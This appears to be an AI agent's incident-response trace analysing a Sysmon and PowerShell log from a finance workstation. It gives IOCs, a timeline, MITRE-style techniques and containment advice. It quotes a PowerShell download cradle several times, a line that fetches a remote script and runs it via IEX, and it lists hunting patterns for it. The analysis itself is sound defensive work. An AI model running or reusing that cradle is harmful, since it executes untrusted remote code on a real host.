data.text: I have a Sysmon log and a context note; I’ll parse the log and extract indicators from both artifacts in parallel to ground the investigation in evidence.
The initial artifacts already show a PowerShell download cradle, a suspicious homoglyph domain, and AppData DLL/rundll32 activity. I’ll record that and enrich the IP/domain externally.

args.rationale: Establish whether the provided artifacts contain concrete indicators and execution evidence before drawing conclusions.
args.expected: I expected to find either benign macro activity or direct signs of payload retrieval, persistence, and related infrastructure.
args.found: parse_log on artifact 8f328cfa-c9ba-47ff-a9d3-4a73d8bbbd3e returned 9 events including PowerShell Operational EventID=4104 at 2026-05-18T11:02:14Z and the script line '$c=New-Object Net.WebClient;$c.DownloadString("http://45.33.32.156/a.ps1") | IEX'. The same parse_log result also included Sysmon EventID=3 network connect at 2026-05-18T11:02:15Z with DestinationIp: 45.33.32.156, EventID=11 file create at 2026-05-18T11:02:21Z, and EventID=13 registry value set at 2026-05-18T11:02:25Z. extract_iocs on the same artifact identified URL http://45.33.32.156/a.ps1, IP 45.33.32.156, file paths C:\Users\jhamilton\AppData\Roaming\Microsoft\Windows\l.dll, C:\Users\jhamilton\AppData\Roaming\Microsoft\Windows\l.dll,EntryPoint, C:\Users\jhamilton\Downloads\Q2_Revenue_Forecast.docm, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, and C:\Windows\System32\rundll32.exe. extract_iocs on artifact 59fa4bf2-d7a7-43d4-824f-cec56a094653 identified suspicious domain corp-fіnance.com and repeated the same IP and URL.
args.next_step: Enrich the external IP 45.33.32.156 and suspicious domain corp-fіnance.com, then build a timeline from the observed events.

data.found: parse_log on artifact 8f328cfa-c9ba-47ff-a9d3-4a73d8bbbd3e returned 9 events including PowerShell Operational EventID=4104 at 2026-05-18T11:02:14Z and the script line '$c=New-Object Net.WebClient;$c.DownloadString("http://45.33.32.156/a.ps1") | IEX'. The same parse_log result also included Sysmon EventID=3 network connect at 2026-05-18T11:02:15Z with DestinationIp: 45.33.32.156, EventID=11 file create at 2026-05-18T11:02:21Z, and EventID=13 registry value set at 2026-05-18T11:02:25Z. extract_iocs on the same artifact identified URL http://45.33.32.156/a.ps1, IP 45.33.32.156, file paths C:\Users\jhamilton\AppData\Roaming\Microsoft\Windows\l.dll, C:\Users\jhamilton\AppData\Roaming\Microsoft\Windows\l.dll,EntryPoint, C:\Users\jhamilton\Downloads\Q2_Revenue_Forecast.docm, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, and C:\Windows\System32\rundll32.exe. extract_iocs on artifact 59fa4bf2-d7a7-43d4-824f-cec56a094653 identified suspicious domain corp-fіnance.com and repeated the same IP and URL.

data.text: I have enrichment for the IP and a failed lookup for the Unicode domain. Next I’ll build a timeline from the parsed timestamps and record both the infrastructure context and the lookup limitation.

args.rationale: Validate whether the contacted infrastructure has external context and document any enrichment gaps accurately.
args.expected: I expected the IP or sender domain to show public reputation or hosting context that might clarify whether the payload source was obviously malicious.
args.found: fetch_url to https://ipinfo.io/45.33.32.156/json returned HTTP 200 with JSON identifying 45.33.32.156 as hostname scanme.nmap.org in Fremont, California, US, org AS63949 Akamai Connected Cloud. fetch_url to https://otx.alienvault.com/api/v1/indicators/IPv4/45.33.32.156/general returned HTTP 200 and JSON showing indicator 45.33.32.156 with reputation 0 and pulse_info.count 3. fetch_url to https://otx.alienvault.com/api/v1/indicators/domain/corp-f%D1%96nance.com/general returned HTTP 400 with body '{"detail": "Invalid domain (corp-fіnance.com)", "error": "malformed hostname or domain"}', so external enrichment for that Unicode domain failed and cannot support additional claims about it.
args.next_step: Record the execution sequence as a timeline and conclude on likely intent using only the observed download-and-execute, DLL path, rundll32 reference, and Run-key persistence evidence.

data.found: fetch_url to https://ipinfo.io/45.33.32.156/json returned HTTP 200 with JSON identifying 45.33.32.156 as hostname scanme.nmap.org in Fremont, California, US, org AS63949 Akamai Connected Cloud. fetch_url to https://otx.alienvault.com/api/v1/indicators/IPv4/45.33.32.156/general returned HTTP 200 and JSON showing indicator 45.33.32.156 with reputation 0 and pulse_info.count 3. fetch_url to https://otx.alienvault.com/api/v1/indicators/domain/corp-f%D1%96nance.com/general returned HTTP 400 with body '{"detail": "Invalid domain (corp-fіnance.com)", "error": "malformed hostname or domain"}', so external enrichment for that Unicode domain failed and cannot support additional claims about it.

data.text: The evidence supports a short malicious chain: PowerShell download cradle, outbound connection, DLL creation under AppData, rundll32 usage, and Run key persistence. I’ll finalize with bounded conclusions and response actions.

args.summary: On WIN-FIN-07, the provided PowerShell/Sysmon evidence shows PowerShell script-block activity at 2026-05-18T11:02:14Z containing a download cradle that retrieved and executed code from http://45.33.32.156/a.ps1 via IEX. One second later, Sysmon recorded a network connection to 45.33.32.156, followed within 11 seconds by process creation, file creation, another process creation, and a registry value set. IOC extraction from the same artifact identified a DLL path under C:\Users\jhamilton\AppData\Roaming\Microsoft\Windows\l.dll, a rundll32 invocation target using l.dll,EntryPoint, and the originating document path C:\Users\jhamilton\Downloads\Q2_Revenue_Forecast.docm. This supports malicious macro-enabled initial execution leading to remote script retrieval and persistence on a single finance workstation; the exact second-stage payload contents are not present in the supplied artifacts, so intent beyond execution and persistence cannot be decoded further from this evidence alone.

iocs.context: PowerShell script block downloaded http://45.33.32.156/a.ps1 and Sysmon logged a network connection to the same IP.
Observed directly in PowerShell script block logging.

DLL export target extracted from the Sysmon log artifact, consistent with rundll32 execution.
Executable path extracted from the Sysmon log artifact.
Executable path extracted from the Sysmon log artifact.

ttps.name: User Execution: Malicious File
ttps.evidence: IOC extraction identified the originating document path C:\Users\jhamilton\Downloads\Q2_Revenue_Forecast.docm, and the case context states the activity was launched from Word macro on WIN-FIN-07.

ttps.name: Command and Scripting Interpreter: PowerShell
ttps.evidence: PowerShell script block logging recorded '$c=New-Object Net.WebClient;$c.DownloadString("http://45.33.32.156/a.ps1") | IEX' at 2026-05-18T11:02:14Z.

ttps.name: Ingress Tool Transfer
ttps.evidence: The PowerShell script block explicitly downloaded remote content from http://45.33.32.156/a.ps1, and Sysmon logged a network connection to 45.33.32.156 one second later.

ttps.name: System Binary Proxy Execution: Rundll32
ttps.evidence: IOC extraction from the log identified C:\Windows\System32\rundll32.exe and the target C:\Users\jhamilton\AppData\Roaming\Microsoft\Windows\l.dll,EntryPoint.

ttps.name: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
ttps.evidence: parse_log recorded Sysmon EventID=13 (Registry value set) at 2026-05-18T11:02:25Z, following DLL creation and process execution.

timeline.event: PowerShell script block logged; embedded command downloads and executes http://45.33.32.156/a.ps1 via IEX.
Second PowerShell EventID 4104 recorded in the same burst.
Sysmon network connection event recorded; destination IP 45.33.32.156.
Sysmon file creation event recorded; related IOC extraction identified C:\Users\jhamilton\AppData\Roaming\Microsoft\Windows\l.dll.
Second Sysmon process creation event recorded; related IOC extraction identified rundll32.exe and l.dll,EntryPoint.
Sysmon registry value set event recorded, consistent with persistence establishment.

recommendations: Immediately isolate WIN-FIN-07 from the network and preserve volatile data if memory acquisition is part of your IR process.
Block outbound access to 45.33.32.156 and the URL path /a.ps1 at network and endpoint controls, and search for any additional connections to that IP across the environment.

Quarantine and collect the document C:\Users\jhamilton\Downloads\Q2_Revenue_Forecast.docm, the DLL C:\Users\jhamilton\AppData\Roaming\Microsoft\Windows\l.dll, and the relevant Run key value for offline malware analysis.

Perform host-based triage on WIN-FIN-07 to identify the exact registry Run value, parent/child process command lines, scheduled tasks, services, additional dropped files, and any credential access or lateral movement not shown in the supplied artifact.
Reset credentials for user jhamilton after assessing token theft risk, and review authentication logs for unusual activity following 2026-05-18T11:02:14Z.

Hunt across endpoints for PowerShell script block text containing 'DownloadString' plus 'IEX', for rundll32 launching DLLs from user AppData paths, and for the filename Q2_Revenue_Forecast.docm or references to corp-fіnance.com.
Strengthen email controls for homoglyph/lookalike domains and disable or tightly restrict Office macros from internet-origin documents where operationally possible.
